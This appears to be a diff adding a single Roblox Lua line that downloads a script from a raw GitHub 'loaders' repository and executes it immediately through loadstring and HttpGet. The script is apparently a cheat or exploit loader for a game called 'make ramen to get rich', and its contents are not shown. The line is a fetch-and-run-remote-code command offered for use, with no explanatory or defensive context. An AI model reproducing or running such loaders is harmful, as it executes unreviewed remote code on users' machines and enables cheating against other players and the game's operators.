@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/make-ramen-to-get-rich-release-spam7-b1ocrzt0hi6m2w.lua"))()
